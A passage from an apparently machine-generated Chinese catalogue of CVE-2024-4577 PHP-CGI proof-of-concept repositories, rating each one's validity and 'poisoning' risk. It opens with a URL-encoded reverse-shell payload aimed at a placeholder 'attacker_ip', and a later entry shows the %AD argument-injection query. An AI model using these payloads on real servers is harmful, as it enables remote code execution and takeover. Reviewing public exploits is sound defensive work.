`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #8

**来源**: [CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md](../2024/CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows)

**利用条件:** Windows服务器, PHP以CGI模式运行，且系统使用某些启用了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的参数注入漏洞。当系统启用了某些使用“Best Fit”策略的代码页时，Windows 可能会使用该策略替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**
攻击者通过构造特殊的 URL，包含经过 "Best Fit" 转换后会被 PHP 解释器解析为选项的字符，从而注入恶意参数。PoC 代码利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并直接将包含恶意代码的请求体作为 PHP 代码执行，实现远程代码执行。

**有效性：**
根据漏洞信息，搜索结果和提供的漏洞利用代码，该POC代码有效。已经有实际的攻击案例发生。

**投毒风险：**
查看PoC代码，主要功能是发送包含特定参数的POST请求，以利用漏洞实现RCE。初步分析PoC代码没有明显的恶意行为，但是由于代码可以执行任意命令,存在一定风险. 投毒风险评估为5%。
  * 依赖的requests模块本身可能有潜在风险
  * 虽然代码中没有直接的恶意逻辑，但攻击者可能会修改PoC，添加反弹shell、下载恶意文件等功能。

**项目地址:** [Gill-Singh-A/CVE-2024-4577-Exploit](https://github.com/Gill-Singh-A/CVE-2024-4577-Exploit)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #9

**来源**: [CVE-2024-4577-Ianthinus_CVE-2024-4577.md](../2024/CVE-2024-4577-Ianthinus_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统 + Apache + PHP-CGI + 存在Best-Fit策略的codepage

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当以 CGI 模式运行时，并且系统启用了使用 "Best Fit" 策略的代码页时，可能受到攻击。

**利用方式：**
攻击者可以利用 Windows 的 "Best-Fit" 字符转换行为，将恶意参数注入到 PHP CGI 进程的命令行参数中。PHP CGI 模块会将这些被转换后的字符解释为 PHP 选项，从而允许攻击者执行以下操作：

1.  **源代码泄露：** 通过注入参数来泄露 PHP 脚本的源代码。
2.  **远程代码执行：** 通过注入参数来执行任意 PHP 代码。

**POC 代码分析：**
提供的 POC 代码包含以下文件：

*   `Readme`：包含使用 PowerShell 进行漏洞利用的示例。通过 POST 请求，将包含恶意 PHP 代码的 payload 发送到目标服务器，并利用 `%AD` 字符绕过某些安全限制，设置 `allow_url_include` 和 `auto_prepend_file` 选项，从而执行远程代码。
*   `check.php`：用于检测目标环境是否满足漏洞利用的条件，包括 PHP 版本、SAPI 模式、操作系统和系统区域设置。
*   `httpd-xampp.conf`：XAMPP 的 Apache 配置文件，用于配置 PHP 环境。

**有效性：**
提供的 POC 代码是有效的，可以用于在满足漏洞利用条件的环境中执行任意 PHP 代码。搜索引擎结果也表明该漏洞已经被广泛利用。

**投毒风险：**
该仓库主要用于演示和验证 CVE-2024-4577 漏洞。 虽然主要代码看起来是无害的，但考虑到以下因素，存在一定的投毒风险：

*   POC本身就是一段恶意的代码，能执行远程命令。
*   `Readme` 文件中的 PowerShell 命令直接执行 POST 请求，存在注入恶意代码的可能性。 虽然例子是`whoami`但是如果被替换成别的, 则会造成投毒。

考虑到POC的特殊性，这里将投毒风险评估为10%。主要原因是，大部分代码是用于漏洞检测和利用，恶意代码的存在是为了利用漏洞，而不是为了隐藏恶意功能。

**项目地址:** [Ianthinus/CVE-2024-4577](https://github.com/Ianthinus/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #10

**来源**: [CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md](../2024/CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行和敏感信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，并启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 平台上的 PHP CGI 模式。当系统配置为使用某些代码页时，Windows 可能会使用“Best-Fit”策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞信息和搜索结果，此漏洞的利用是有效的。多个来源表明该漏洞已在野外被利用，并且存在公开可用的 PoC 代码。

**投毒风险：**
提供的代码库是一个扫描器，用于检测系统是否容易受到 CVE-2024-4577 攻击。它没有包含漏洞利用代码，因此，直接利用此代码库进行攻击是不可能的。主要代码是检测是否存在漏洞，而非利用漏洞。代码库虽然引入了requests,colorama,pyfiglet等库,但在合理的范围内,没有发现明显的恶意代码或后门,但是考虑到任何依赖引入都存在一定的风险，因此投毒风险评估为10%。

**利用方式：**
该漏洞利用方式如下：
1.  **目标环境：** 目标服务器必须运行在 Windows 操作系统上，并且 PHP 运行在 CGI 模式下。
2.  **代码页配置：** 系统需要配置为使用某种代码页，该代码页使用 "Best Fit" 策略进行字符转换。
3.  **参数注入：** 攻击者通过构造包含特定字符的 URL 或 POST 请求，利用 Windows 的 "Best Fit" 转换特性，将恶意参数注入到 PHP 的命令行中。
4.  **远程代码执行：** 注入的恶意参数被 PHP CGI 模块解析，从而允许攻击者执行任意 PHP 代码或操作系统命令。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数来直接执行 PHP 代码。

攻击者可以利用此漏洞读取服务器上的敏感文件，修改网站内容，甚至完全控制服务器。

**项目地址:** [InfoSec-DB/PHPCGIScanner](https://github.com/InfoSec-DB/PHPCGIScanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #11

**来源**: [CVE-2024-4577-Jcccccx_CVE-2024-4577.md](../2024/CVE-2024-4577-Jcccccx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，可能导致完全控制受影响的Windows服务器

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8

**利用条件:** Windows服务器，Apache，PHP-CGI模式，系统使用特定的代码页并启用了"Best Fit"策略

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞允许未经身份验证的攻击者在易受攻击的Windows PHP服务器上执行任意代码。该漏洞源于PHP-CGI在Windows环境下的参数处理缺陷，当系统配置为使用具有“Best-Fit”行为的代码页时，传递给Win32 API函数的命令行参数中的某些字符可能会被错误地解释为PHP选项。攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意选项，从而导致远程代码执行。

**利用方式：**

1.  **目标确认：** 确认目标服务器运行在Windows系统上，并且使用Apache和PHP-CGI模式。
2.  **代码页检测：** 确认目标系统的代码页配置允许"Best Fit"转换。
3.  **构造恶意URI：** 构造包含恶意PHP选项的URI，例如，使用`cgi.force_redirect=0`绕过重定向限制，使用`allow_url_include=1`允许包含远程文件，使用`auto_prepend_file=php://input`将POST数据作为PHP代码执行。
4.  **发送POST请求：**  发送POST请求到构造的URI，并将包含恶意代码的PHP代码作为请求体发送。
5.  **命令执行：** 服务器执行恶意PHP代码，攻击者可以执行任意系统命令。

**POC 分析：**

提供的POC代码 `CVE_2024_4577_test.py` 主要用于检测漏洞是否存在，它通过构造特定的URI和PHP代码，发送POST请求到目标服务器，并检查响应中是否包含预期的输出，以验证漏洞是否可利用。 `CVE_2024_4577_exp.py` 是用于执行命令的EXP。

**投毒风险分析：**

仔细检查了提供的POC代码，未发现任何明显的投毒迹象。代码逻辑清晰，主要功能是发送精心构造的HTTP请求，并检查响应以确认漏洞的存在。使用的PHP代码也是为了执行预定的测试命令，没有发现任何试图在目标系统上安装后门或执行恶意操作的代码。

**搜索引擎结果：**

搜索结果表明CVE-2024-4577是一个严重的、广泛利用的漏洞。多个安全厂商和研究人员都发布了相关的分析和警告。该漏洞已被添加到CISA的已知被利用漏洞目录（KEV），表明该漏洞在野外被积极利用。


**项目地址:** [Jcccccx/CVE-2024-4577](https://github.com/Jcccccx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #12

**来源**: [CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md](../2024/CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows上PHP-CGI的远程代码执行漏洞。当PHP以CGI模式运行时，如果系统配置了使用"Best-Fit"策略的代码页，Windows可能会使用此策略替换传递给Win32 API函数的命令行中的字符。 PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，这可能导致泄露脚本源码、在服务器上运行任意PHP代码等。

**漏洞利用方式：**

1.  **攻击向量：** 通过构造特定的URL或POST请求，向PHP-CGI传递恶意参数。
2.  **参数注入：** 攻击者可以使用"Best-Fit"转换后的字符来注入PHP配置选项，例如`allow_url_include`和`auto_prepend_file`。
3.  **远程代码执行：** 利用`allow_url_include=1`和`auto_prepend_file=php://input`，攻击者可以将任意PHP代码作为请求体发送到服务器执行。

**POC有效性：**

提供的POC代码（`cve_2024_4577_checker.sh`）是一个漏洞检测脚本，用于扫描目标是否存在CVE-2024-4577漏洞。它通过发送包含恶意参数的HTTP请求来判断目标是否容易受到攻击。根据漏洞库信息和搜索结果,此漏洞已存在公开可用的exp. 

**投毒风险：**

该漏洞利用代码主要包含了一个检测脚本,用于检测目标是否存在漏洞, 漏洞利用代码本身主要用于检测,未发现明显的恶意行为。 但是为了保证绝对安全,仍需要人工review代码,  投毒风险较低，约为 1%.

**项目地址:** [JeninSutradhar/CVE-2024-4577-checker](https://github.com/JeninSutradhar/CVE-2024-4577-checker)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #13

**来源**: [CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md](../2024/CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，并且系统启用了使用“Best Fit”策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows系统上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而可能泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞信息和搜索结果，以及利用代码，该漏洞利用的有效性很高。多个来源表明该漏洞已被积极利用，并且存在公开可用的PoC代码。

**投毒风险：**
分析提供的PoC代码 `CVE-2024-4577.py`，未发现明显的恶意投毒代码。PoC主要功能是检测目标是否存在漏洞，并提供一个交互式shell来执行命令。代码中包含了一些编码转换和请求发送，但没有发现植入后门的迹象。但是，任何下载和执行来自不可信来源的脚本都存在风险，需要进行代码审计。

根据经验判断，投毒风险约为5%。

**利用方式：**
1.  **漏洞触发：** 攻击者需要向目标服务器发送特制的HTTP请求，请求中包含经过特殊编码的恶意PHP选项作为查询字符串参数。这些参数会被传递给php-cgi.exe。
2.  **参数注入：**  利用Windows系统的“Best-Fit”字符转换特性，构造出PHP可以识别的参数。PoC代码中使用了`%AD`代替`-`，`%3D`代替`=`，`+`代替空格。
3.  **远程代码执行：**  通过注入`-d allow_url_include=1 -d auto_prepend_file=php://input`等参数，允许包含远程文件，并将POST请求的内容作为PHP代码执行，从而实现远程代码执行。
4.  **信息泄露：** 攻击者可以通过参数注入来读取服务器上的任意文件。
5.  **交互式Shell：** 通过循环发送请求，模拟一个交互式Shell，允许攻击者执行任意命令。

**项目地址:** [K3ysTr0K3R/CVE-2024-4577-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #14

**来源**: [CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md](../2024/CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md)

## CVE-2024-4577 - PHP-CGI 参数注入导致RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows服务器，PHP以CGI模式运行，开启了使用"Best Fit"策略的编码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个存在于Windows环境下以CGI模式运行的PHP中的高危漏洞。由于Windows系统在特定代码页下，会使用"Best-Fit"策略转换命令行参数中的字符，PHP-CGI模块可能错误地将这些字符解析为PHP选项，从而允许攻击者注入恶意PHP代码。  

**利用方式：**
攻击者通过构造包含特定字符的URL，欺骗PHP-CGI解析器将恶意代码作为配置选项执行。POC代码`cve_2024_4577_tester.py`通过发送包含如下Payload的POST请求来验证漏洞：

```
?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input
```
以及 POST Body:
```php
<?php echo 'CVE-2024-4577-TEST'; ?>
```
其中，`%AD` 和 `d` 的组合是为了绕过某些安全限制。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input`  将POST请求的内容作为PHP代码执行。

**投毒风险分析：**
虽然POC代码本身是为了验证漏洞，但仍然存在一定的投毒风险。该脚本从用户处获取目标URL，然后发送包含PHP代码的POST请求。如果攻击者修改此脚本，例如：

1.  **修改Payload：**  将测试用的`echo`语句替换为更隐蔽的恶意代码，例如反弹shell，上传webshell等。
2.  **增加后门：**  在成功利用漏洞后，在目标服务器上留下后门，以便长期控制。
3.  **信息收集：**  收集用户输入的目标URL和其他信息，发送给攻击者。

尽管存在风险，但此POC代码相对简单，风险主要取决于使用者是否对其进行修改和滥用。 由于代码短小, 容易审核, 投毒风险较低, 估计为 5%。

**项目地址:** [KimJuhyeong95/cve-2024-4577](https://github.com/KimJuhyeong95/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #15

**来源**: [CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md](../2024/CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md)

## CVE-2024-4577 PHP-CGI 参数注入 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，系统配置使用特定的代码页，允许Best-Fit转换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 系统下以 CGI 模式运行的 PHP 版本中。如果系统配置使用了某些代码页，Windows 可能会使用 "Best-Fit" 策略来替换命令行参数中的字符。PHP CGI 模块可能错误地将这些字符解析为 PHP 选项，从而允许攻击者向 PHP 二进制文件传递选项，导致泄露源代码、执行任意 PHP 代码甚至执行系统命令。

**有效性：**
提供的漏洞利用代码看起来是有效的。它是一个 Python 脚本，旨在自动化 CVE-2024-4577 和 CVE-2024-8926 的利用。它提供了多种攻击模式，例如执行系统命令、执行 PHP 代码、上传和下载文件。脚本还具有 Tor 代理支持、日志记录和自动编码转换等功能，这表明它是一个功能齐全的漏洞利用工具。

**投毒风险：**
该仓库的投毒风险评估为 10%。该脚本主要利用了已知的漏洞，并没有明显的恶意代码。风险主要来自于以下几点：
* 使用 Tor 代理支持，有可能会连接到恶意的 Tor 节点。
* 脚本提供文件上传功能，攻击者可能会上传恶意文件到服务器。
* 脚本的作者身份未知，存在潜在的供应链风险。

**利用方式：**
1.  **环境准备：**  攻击者需要一个运行易受攻击的 PHP 版本的 Windows 服务器，并以 CGI 模式运行。此外，系统还应配置为使用具有 Best-Fit 转换的代码页。
2.  **漏洞利用：**  攻击者将构造一个包含恶意 PHP 选项的 HTTP 请求。由于 Best-Fit 转换，服务器会将某些字符替换为其他字符，这将被 PHP CGI 模块错误地解析为 PHP 选项。例如，攻击者可以传递 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，以允许包含远程文件并执行任意 PHP 代码。
3.  **远程代码执行：**  通过上述操作，攻击者可以执行任意 PHP 代码，包括执行系统命令、上传 webshell 等。

综上所述，CVE-2024-4577 是一个严重的安全漏洞，利用起来相对简单，攻击后果非常严重，可能导致服务器完全沦陷。强烈建议受影响的用户尽快升级到受保护的版本。

**项目地址:** [Night-have-dreams/php-cgi-Injector](https://github.com/Night-have-dreams/php-cgi-Injector)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #16

**来源**: [CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md](../2024/CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的 PHP 服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows 系统，运行于 CGI 模式下的 PHP，且系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统以 CGI 模式运行时，由于系统代码页的 "Best Fit" 行为导致参数注入的远程代码执行漏洞。攻击者可以通过构造恶意的 HTTP 请求，将恶意参数传递给 PHP 解释器，从而执行任意代码。

**有效性评估：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞的有效性很高。漏洞库明确指出该漏洞的存在，并提供了受影响的版本范围。搜索引擎结果显示，该漏洞在野外已存在利用，且有公开的 PoC 代码可供验证。漏洞利用代码（Incident Response Walkthrough）提供了一个应对 CVE-2024-4577 攻击的案例分析，虽未直接提供 PoC 代码，但分析过程表明了该漏洞可被利用，并附带了模拟攻击场景。

**投毒风险分析：**

提供的漏洞利用代码主要是一个事件响应的演练文档，用于分析和缓解 CVE-2024-4577 漏洞。它主要关注识别漏洞、分析攻击者行为以及确定受影响的系统。虽然该文档提到了攻击者可能执行的命令（whoami.exe、calc.exe），但它本身并不包含任何恶意代码。因此，可以认为此仓库中作者隐藏的投毒代码的可能性较低，约为 5%。 这 5% 的可能性是基于对任何代码库都不能完全排除潜在风险的一般安全考虑。

**利用方式分析：**

1.  **环境要求：** 目标系统必须是 Windows，PHP 运行于 CGI 模式，并且启用了使用 "Best Fit" 策略的代码页。
2.  **漏洞触发：** 攻击者发送包含恶意构造参数的 HTTP 请求。这些参数会被 Windows 的 "Best Fit" 代码页转换机制错误地解释为 PHP 选项。
3.  **代码执行：** PHP 解释器执行被注入的恶意选项，导致任意代码执行。

攻击者通过构造特殊的 URL 或 POST 数据，将恶意的 PHP 参数注入到 PHP 进程中。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数直接执行 PHP 代码。利用方式依赖于服务器的配置和 PHP 版本的具体细节。

**项目地址:** [PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough](https://github.com/PhinehasNarh/CVE-2024-4577-LetsDefend-walkthrough)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #17

**来源**: [CVE-2024-4577-Skycritch_CVE-2024-4577.md](../2024/CVE-2024-4577-Skycritch_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是PHP的一个远程代码执行漏洞，存在于Windows系统上以CGI模式运行的PHP中。当系统配置为使用某些代码页时，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码，在服务器上运行任意PHP代码等。 

**有效性分析：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，存在公开的PoC利用代码。漏洞利用代码 `CVE-2024-4577.py` 尝试通过在URL中注入PHP选项来利用此漏洞。具体来说，它设置 `allow_url_include` 为 1，并使用 `auto_prepend_file` 包含 `php://input`，然后将要执行的PHP代码通过POST请求发送到目标URL。如果返回结果中包含“1337”，则认为漏洞利用成功。

**投毒风险分析：**
查看提供的POC代码，主要功能是利用漏洞执行任意PHP代码。 `CVE-2024-4577.py`  没有发现明显的恶意代码，该脚本的主要作用是发送包含恶意PHP代码的请求。风险很低。
`README.md`文件只包含漏洞名称，没有投毒风险。
整体投毒风险评估为1%。

**利用方式：**
利用方式如下：
1.  攻击者需要找到运行在Windows服务器上的、使用CGI模式的、且存在漏洞的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）。
2.  攻击者构造包含恶意PHP选项的URL，并将其附加到目标PHP脚本的URL后面。
3.  攻击者使用POST请求将要执行的PHP代码发送到服务器。
4.  如果漏洞利用成功，服务器将执行攻击者提供的PHP代码。

**优先级排序依据：**
根据您的要求，分析时遵循以下优先级：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息。
搜索引擎结果用于确认漏洞的广泛性和影响，漏洞利用代码用于分析利用方式和潜在的投毒风险，漏洞库信息用于验证漏洞的存在和影响范围。

**项目地址:** [Skycritch/CVE-2024-4577](https://github.com/Skycritch/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #18

**来源**: [CVE-2024-4577-VictorShem_CVE-2024-4577.md](../2024/CVE-2024-4577-VictorShem_CVE-2024-4577.md)

## CVE-2024-4577 - PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (运行于 Windows CGI 模式)

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统上 PHP 以 CGI 模式运行，且系统启用了使用 "Best Fit" 策略的代码页。通常是 XAMPP 环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统中以 CGI 模式运行时的一个参数注入漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或执行任意 PHP 代码。

**有效性：** 提供的 POC 代码 `CVE-2024-4577.yaml` 看起来是有效的 Nuclei 模板，旨在检测和利用此漏洞。它通过向目标 URL 发送带有特殊构造的 payload 的 HTTP 请求，payload 中包含 `%AD` 字符和恶意的 PHP 配置选项（`allow_url_include=1` 和 `auto_prepend_file=php://input`），以及要执行的 PHP 代码（`<?php phpinfo(); ?>`）。如果漏洞存在且利用成功，服务器应该返回包含 PHP 版本信息的页面。

**投毒风险：**
查看了提供的 POC 代码 `CVE-2024-4577.yaml` 和 `README.md` 文件。其中利用方式是通过构造特定的 URL，包含 `%AD` 字符以及 `allow_url_include` 和 `auto_prepend_file` 等配置项，结合 POST 请求执行 PHP 代码。这个利用过程本身就是一种后门植入的方式，但这是漏洞利用的固有行为，不应被视为恶意投毒。

`README.md` 中包含用于 FOFA 和 Censys 的搜索语句，用于发现暴露在公网上的 XAMPP 服务器。这部分内容本身无害，只是为了方便漏洞发现和利用。但也可能会被恶意攻击者利用。

综合来看，该仓库中不存在明显的恶意投毒代码，但存在被滥用的风险，因此给出 10% 的投毒风险。

**利用方式：**
1.  **环境准备：** 目标系统必须是运行在 Windows 上的 PHP，并且是以 CGI 模式运行。同时，系统的代码页需要启用 "Best Fit" 策略。
2.  **构造 Payload：** 攻击者需要构造包含 `%AD` 字符的特殊 URL，以及恶意的 PHP 配置选项，例如 `allow_url_include=1` 和 `auto_prepend_file=php://input`。其中 `%AD` 是触发 Windows "Best Fit" 转换的关键。
3.  **发送请求：** 攻击者通过 HTTP POST 请求将构造好的 payload 发送到目标服务器的 PHP 脚本，同时在 POST body 中包含要执行的 PHP 代码。
4.  **远程代码执行：** 如果漏洞存在且利用成功，目标服务器将执行 POST body 中的 PHP 代码，从而实现远程代码执行。

**项目地址:** [VictorShem/CVE-2024-4577](https://github.com/VictorShem/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #19

**来源**: [CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-ZephrFish_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，运行于Windows+Apache+PHP-CGI环境，且启用了Best-Fit策略的CodePage

**利用条件:** 目标服务器需满足特定PHP版本、Windows环境、Apache服务器、PHP-CGI模式，以及存在使用Best-Fit策略的CodePage设置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，存在于Windows平台的特定PHP版本中。攻击者可以通过精心构造的URL，利用Windows系统的“Best Fit”字符转换特性，将恶意参数注入到PHP的执行命令中，最终实现远程代码执行。 

**有效性:**
提供的POC代码是有效的，通过发送包含`allow_url_include`和`auto_prepend_file`参数的POST请求，并包含PHP代码`<?php phpinfo(); ?>`，如果目标存在漏洞，则会执行该代码并返回`phpinfo()`的结果。

**投毒风险:**
提供的代码主要用于检测漏洞是否存在，功能较为直接，没有发现隐藏的恶意代码或后门。该仓库的`CODEOWNERS`文件中只包含`@zephrfish`，该用户有代码审核权，因此综合评估认为投毒的可能性较低。

**利用方式:**
1.  **环境确认:** 漏洞利用前需要确认目标服务器是否满足以下条件：
    *   Windows操作系统
